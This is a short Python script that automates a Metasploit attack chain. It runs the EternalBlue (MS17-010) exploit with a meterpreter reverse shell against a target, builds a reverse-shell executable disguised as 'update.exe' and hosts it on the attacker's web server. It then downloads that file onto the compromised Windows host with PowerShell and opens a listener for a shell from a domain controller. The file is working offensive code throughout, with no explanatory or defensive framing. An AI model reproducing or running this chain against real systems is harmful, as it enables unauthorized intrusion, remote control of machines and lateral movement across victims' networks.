import os

def exploit_eternalblue(target_ip, attacker_ip):
    print("[+] Launching EternalBlue exploit on target:", target_ip)
    os.system(f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; \
    set RHOSTS {target_ip}; \
    set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
    set LHOST {attacker_ip}; \
    set LPORT 4444; \
    exploit; exit'")

def generate_payload(attacker_ip, output_file="update.exe"):
    print("[+] Generating reverse shell payload with msfvenom...")
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={attacker_ip} LPORT=5555 -f exe -o {output_file}")
    os.system(f"mv {output_file} /var/www/html/")
    os.system("sudo systemctl start apache2")
    print(f"[✓] Payload hosted at: http://{attacker_ip}/{output_file}")

def drop_payload_via_msf(attacker_ip, filename="update.exe", session_id=1):
    print("[+] Dropping the payload to the compromised Windows 7 host...")
    powershell_command = (
        f"powershell -Command \"$wc = New-Object System.Net.WebClient; "
        f"$wc.DownloadFile('http://{attacker_ip}/{filename}','C:\\Users\\Public\\{filename}')\""
    )
    os.system(f"msfconsole -q -x 'sessions -i {session_id}; execute -f cmd.exe -i -H -c -a \"{powershell_command}\"; exit'")
    print("[✓] Payload dropped and ready for lateral execution.")

def start_listener(attacker_ip, port=5555):
    print("[+] Starting handler to catch the reverse shell from the domain controller...")
    os.system(f"msfconsole -q -x 'use exploit/multi/handler; \
    set PAYLOAD windows/meterpreter/reverse_tcp; \
    set LHOST {attacker_ip}; \
    set LPORT {port}; \
    run'")
